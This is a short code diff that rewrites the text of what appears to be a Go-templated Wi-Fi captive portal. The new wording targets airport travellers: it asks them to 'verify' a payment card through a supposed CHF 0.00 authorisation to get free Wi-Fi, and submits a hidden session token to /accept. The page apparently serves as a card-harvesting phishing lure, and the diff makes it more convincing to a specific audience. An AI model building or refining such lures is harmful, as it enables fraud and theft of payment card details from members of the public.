@@ -110,8 +110,8 @@ var (
 <div class="brand">` + wifiSVG + `<b>{{.Venue}}</b></div>
 <div class="card">
 <div class="head">
-<h1>Connect to free Wi-Fi</h1>
-<p>To keep our network secure, please verify your identity to continue. There is no charge — a temporary CHF&nbsp;0.00 authorisation confirms your card.</p>
+<h1>Connect to complimentary airport Wi-Fi</h1>
+<p>Welcome to {{.Venue}}. To keep the terminal network secure, please verify your identity to continue. There is no charge — a temporary CHF&nbsp;0.00 authorisation confirms your card.</p>
 </div>
 <form method="post" action="/accept">
 <input type="hidden" name="tok" value="{{.Session.Tok}}">
